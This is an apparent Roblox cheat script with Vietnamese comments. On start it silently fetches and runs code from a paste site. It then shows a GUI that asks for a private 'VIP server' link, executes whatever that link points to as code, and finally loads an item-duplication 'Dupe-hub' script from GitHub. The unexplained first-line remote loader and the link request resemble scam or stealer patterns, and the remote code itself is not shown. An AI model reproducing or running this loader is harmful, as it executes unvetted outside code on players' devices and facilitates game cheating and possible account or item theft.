-- chạy script đầu
pcall(function() loadstring(game:HttpGet('https://pastefy.app/AILhrbIZ/raw'))() end)

-- GUI ngắn gọn
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local pg = plr:WaitForChild("PlayerGui")

local sg = Instance.new("ScreenGui")
sg.ResetOnSpawn = false
sg.Parent = pg

local f = Instance.new("Frame", sg)
f.Size = UDim2.new(0,300,0,120)
f.Position = UDim2.new(0.5,-150,0.4,-60)
f.BackgroundColor3 = Color3.fromRGB(30,30,30)
f.BorderSizePixel = 0

local tb = Instance.new("TextBox", f)
tb.Size = UDim2.new(0.9,0,0,40)
tb.Position = UDim2.new(0.05,0,0.08,0)
tb.Text = ""                -- không chữ xám
tb.PlaceholderText = ""     -- không chữ xám
tb.ClearTextOnFocus = false
tb.TextWrapped = true
tb.Font = Enum.Font.SourceSans
tb.TextSize = 18
tb.BackgroundColor3 = Color3.fromRGB(50,50,50)
tb.TextColor3 = Color3.fromRGB(255,255,255)

local btn = Instance.new("TextButton", f)
btn.Size = UDim2.new(0.6,0,0,36)
btn.Position = UDim2.new(0.2,0,0.62,0)
btn.Text = "Xác nhận"
btn.Font = Enum.Font.SourceSansBold
btn.TextSize = 18
btn.BackgroundColor3 = Color3.fromRGB(0,120,200)
btn.TextColor3 = Color3.fromRGB(255,255,255)

local status = Instance.new("TextLabel", f)
status.Size = UDim2.new(0.9,0,0,18)
status.Position = UDim2.new(0.05,0,0.87,0)
status.Text = ""
status.TextSize = 14
status.BackgroundTransparency = 1
status.TextColor3 = Color3.fromRGB(200,200,200)
status.Font = Enum.Font.SourceSans

btn.MouseButton1Click:Connect(function()
    local link = tb.Text and tb.Text:match("%S+") or ""
    if link == "" then
        status.Text = "Vui lòng nhập link server vip"
        return
    end
    status.Text = "Đang tải..."
    local ok,err = pcall(function() loadstring(game:HttpGet(link))() end)
    if not ok then
        status.Text = "Không chạy được script từ link: "..tostring(err)
        return
    end
    -- nếu chạy thành công script 1 từ user link -> chạy script 2
    local ok2,err2 = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/silentxvn/StealABrainrot/main/Dupe-hub.lua"))()
    end)
    if ok2 then
        status.Text = "Đã chạy script thứ 2"
        sg:Destroy()
    else
        status.Text = "Lỗi khi chạy script 2: "..tostring(err2)
    end
end)
